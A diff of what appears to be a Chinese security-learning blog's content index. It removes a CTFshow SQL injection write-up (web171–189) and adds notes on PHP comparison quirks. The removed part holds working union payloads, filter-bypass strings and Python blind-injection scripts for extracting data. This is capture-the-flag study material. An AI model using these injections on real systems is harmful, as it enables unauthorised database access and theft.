@@ -39,7 +39,7 @@
 <h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
 <p>进入git bash中，按顺序输入如下代码：</p>
 <blockquote>
-<p>git config –global user.email “<a href="mailto:&#x78;&#x78;&#x78;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;">&#x78;&#x78;&#x78;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;</a>“    //填写注册github的邮箱</p>
+<p>git config –global user.email “<a href="mailto:&#120;&#x78;&#120;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#120;&#x78;&#120;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a>“    //填写注册github的邮箱</p>
 </blockquote>
 <blockquote>
 <p>git config –global user.name “xxxx”    //github 用户名</p>
@@ -115,8 +115,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>CISCN</tag>
-        <tag>Web</tag>
-        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
@@ -199,217 +197,56 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Nepnep</tag>
+        <tag>nep</tag>
       </tags>
   </entry>
   <entry>
-    <title>CTFshow web入门 sql</title>
-    <url>/2021/02/09/sql/ctfshow%20SQL/</url>
-    <content><![CDATA[<h1 id="ctfshow-SQL"><a href="#ctfshow-SQL" class="headerlink" title="ctfshow SQL"></a>ctfshow SQL</h1><p>刷一刷ctfshow的sql题，提升一下sql方面的缺陷</p>
-<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>进入后题目给出了sql注入的语句</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;</span><br></pre></td></tr></table></figure>
-<p>构造一下payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 4 %23 # 查询列数</span><br><span class="line">-1&#39; union select 1,2,3 %23 # 查回显点</span><br><span class="line">-1&#39; union select 1,database(),3 %23 # 爆库名</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 %23 # 爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;),3 %23 # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(username,0x7e,password) from ctfshow_user),3 %23 # 爆数据</span><br></pre></td></tr></table></figure>
-<p>最后得到flag</p>
-<blockquote>
-<p>ctfshow{50392f35-7412-4264-833f-ae36542013f0}</p>
+    <title>PHP特性</title>
+    <url>/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/</url>
+    <content><![CDATA[<h2 id="各个函数"><a href="#各个函数" class="headerlink" title="各个函数"></a>各个函数</h2><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><blockquote>
+<p>intval() 函数用于获取变量的整数值。<br>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p>
 </blockquote>
-<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>进入题目就看到一只可爱的小猫在晃，小猫咪虽然很可爱，但是还是得先写题</p>
-<p>进到select模块的无过滤注入2</p>
-<p>跟上题一样，但是回显点变为了两个</p>
-<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>这题也跟171一样，但是返回结果那过滤了flag</p>
-<p>也很简单，我们只需要去掉username的查询就好了，因为flag在username里</p>
-<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>测试了几下发现没数据，抓包发现了一个奇怪的网址</p>
-<p><a href="http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1">http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1</a></p>
-<p>有回显了，但是不是我们想要的，用盲注整整</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user4 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) %23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>这次没回显了，试试时间盲注</p>
-<p>这里是代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user5 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)%23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url+datasql, timeout=<span class="number">0.5</span>)</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>这题简单的过滤了一下关键字，把select过滤了，但是没事</p>
-<p>试试大写绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39; union Select 1,2,3 %23 # 成功得到回显</span><br><span class="line">999&#39; union Select 1,(Select group_concat(username,0x7e,password) From ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
-<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>这题过滤了空格，用/**/绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(username,0x7e,password)&#x2F;**&#x2F;From&#x2F;**&#x2F;ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
-<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>过滤了空格和*号，转用%09绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39;%09union%09Select%091,(Select%09group_concat(username,0x7e,password)%09From%09ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
-<p>后面发现，其实还可以这样写</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure>
-<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>这题把%09也给过滤了，但是还有多种姿势</p>
-<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>可以用上面的非预期直接一把梭</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure>
-<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用%0c绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure>
-<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>用()绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or(1&#x3D;1)%23</span><br></pre></td></tr></table></figure>
-<h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><p>把大部分空格都过滤掉了（180还把%23也过滤了</p>
-<p>这里采用Y4师傅的解法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
-<p>解释一下就是</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1 # 输入进去之后</span><br><span class="line"># sql请求语句</span><br><span class="line">where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line"># 因为and的优先级比or大，所以相当于</span><br><span class="line">where (username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;) or (id&#x3D;26and&#39;1&#39;&#x3D;&#39;1&#39;)</span><br><span class="line"># 因为or左边为false，但是右边为true，所以where的条件为true</span><br><span class="line"># tips：id&#x3D;26正好还是flag的元组，实在是太女少了</span><br></pre></td></tr></table></figure>
-<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>输入ctfshow_user发现有回显，而且where可控</p>
-<p>整个盲注脚本跑出flag</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;result+j&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
-<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>这题过滤了更多的东西，把where也过滤了，但是把空格放出来了</p>
-<p>这里查到了两种解法</p>
-<h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>解法一是参照Y4师傅的用right by进行查询</p>
-<p>这里是盲注脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
-<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>因为count是聚合函数，所以也可以用group by，having来查询</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
-<h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>这题过滤了更多的东西，甚至把数字都过滤了_(¦3」∠)_</p>
-<p>去搜了搜，在Y4师傅那里发现了一张图</p>
-<p><img src="https://i.loli.net/2021/04/06/qQS6KvFXDW41uki.png"></p>
-<p>发现可以上true</p>
-<p>这里是脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Numstr</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&quot;chr(&quot;</span>+Num(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span>+Num(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&quot;</span>.<span class="built_in">format</span>(Numstr(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
-<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>绕过md5($str,true)，直接用户名填写<code>admin</code>密码为<code>ffifdyop</code></p>
-<p>原理的话在这里<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过</a></p>
-<p>然后F12抓个包就可以看到flag了</p>
-<p><img src="https://i.loli.net/2021/04/06/cLivMjtPBDVw5au.png"></p>
-<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>这题是纯知识盲区∑(っ°Д°;)っ</p>
-<p>咱们可以这样子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=<span class="number">0</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure>
-<p>为什么呢↓</p>
-<p>在sql查询时，<code>where username=0</code>这样的查询中，因为数据库里的<code>username</code>都会是字符串，而在<strong>mysql</strong>中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个<code>where</code>条件可以把所有以字母开头的数据查出来</p>
-<p>而<code>passwor=0</code>则是因为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==intval(<span class="variable">$password</span>) <span class="comment"># 弱类型比较</span></span><br><span class="line"><span class="comment"># 因为pass查出来的数据也会是以字母开头的，所有password=0可以利用弱类型比较得到flag</span></span><br></pre></td></tr></table></figure>
-<p>而这样也可以把东西查出来</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=<span class="number">1</span>&lt;<span class="number">1</span>&amp;password=<span class="number">0</span></span><br><span class="line">username=<span class="number">1</span>||<span class="number">1</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure>
-<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2>]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mysql相关函数</title>
-    <url>/2021/02/05/sql/mysql%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="mysql相关函数"><a href="#mysql相关函数" class="headerlink" title="mysql相关函数"></a>mysql相关函数</h1><a id="more"></a>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>version()</td>
-<td>返回数据库版本</td>
-</tr>
-<tr>
-<td>database()</td>
-<td>返回数据库名</td>
-</tr>
-<tr>
-<td>user() current_user() system_user()</td>
-<td>返回用户名</td>
-</tr>
-<tr>
-<td>@@datadir</td>
-<td>返回数据库路径</td>
-</tr>
-<tr>
-<td>@@version_compile_os</td>
-<td>返回操作系统版本</td>
-</tr>
-<tr>
-<td>length()</td>
-<td>返回字符串长度</td>
-</tr>
-<tr>
-<td>substring() substr() mid()</td>
-<td>截取字符串： 参数1：字符串 参数2：起始位置，索引从1开始 参数3：截取长度</td>
-</tr>
-<tr>
-<td>concat()</td>
-<td>不带分隔符链接字符串</td>
-</tr>
-<tr>
-<td>concat_ws()</td>
-<td>带分隔符链接字符串： concat_ws(’-’,‘a’,‘b’,‘c’)</td>
-</tr>
-<tr>
-<td>group_concat()</td>
-<td>链接一组查询结果字符串</td>
-</tr>
-<tr>
-<td>ord() ascii()</td>
-<td>返回字符串的ASCII值</td>
-</tr>
-<tr>
-<td>left()</td>
-<td>从左边开始截取字符串： 参数1：字符串 参数2：截取的长度</td>
-</tr>
-<tr>
-<td>rand()</td>
-<td>返回0-1之间的浮点数</td>
-</tr>
-<tr>
-<td>round()</td>
-<td>四舍五入： round(4.2323151,2)–&gt;4.23</td>
-</tr>
-<tr>
-<td>floor()</td>
-<td>向下取整</td>
-</tr>
-<tr>
-<td>load_file()</td>
-<td>返回读取文件的内容，返回字符串类型</td>
-</tr>
-<tr>
-<td>if()</td>
-<td>判断：if(exp1,exp2,exp3): 如果exp1为真，返回exp2，否则返回exp3</td>
-</tr>
-<tr>
-<td>updatexml()</td>
-<td>报错注入可以用到的函数，如果参数2格式不正确，会报错误信息，此时将需要的函数填在这里就会爆出需要的信息 参数1：string格式，为xml文档对象的名称 参数2：xpath格式的字符串 参数3：string格式，替换查找到的符合条件的数据</td>
-</tr>
-<tr>
-<td>addslashes()</td>
-<td>转义特殊字符（’ “ \）</td>
-</tr>
-<tr>
-<td>hex()</td>
-<td>将字符串转换为16进制</td>
-</tr>
-<tr>
-<td>unhex()</td>
-<td></td>
-</tr>
-<tr>
-<td>limit m,n</td>
-<td>从m开始 查找n条（索引从0开始）</td>
-</tr>
-</tbody></table>
+<p>tips: 数组可以用于得到true。可以识别科学计数法。</p>
+<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><blockquote>
+<p>in_array ( mixed $needle , array $haystack , bool $strict = false ) : bool<br>在大海（haystack）中搜索针（ needle）,如果找到 needle 则返回 true，否则返回 false。</p>
+</blockquote>
+<p>如未设置strict，则为弱比较。</p>
+<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext() / _()"></a>gettext() / _()</h3><p>在当前域中查找消息。</p>
+<p>tips: 唯一一个有别名的函数。</p>
+<h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p>%00截断漏洞。</p>
+<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>无法处理数组。</p>
+<p>有回溯次数上限，PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre设定了一个回溯次数上限 pcre.backtrack_limit。</p>
+<p>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p>
+<h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><p>无法处理数组。</p>
+<h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p>无法处理数组。</p>
+<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="哈希值处理"><a href="#哈希值处理" class="headerlink" title="哈希值处理"></a>哈希值处理</h3><blockquote>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+</blockquote>
+<p>常见0e开头的哈希值</p>
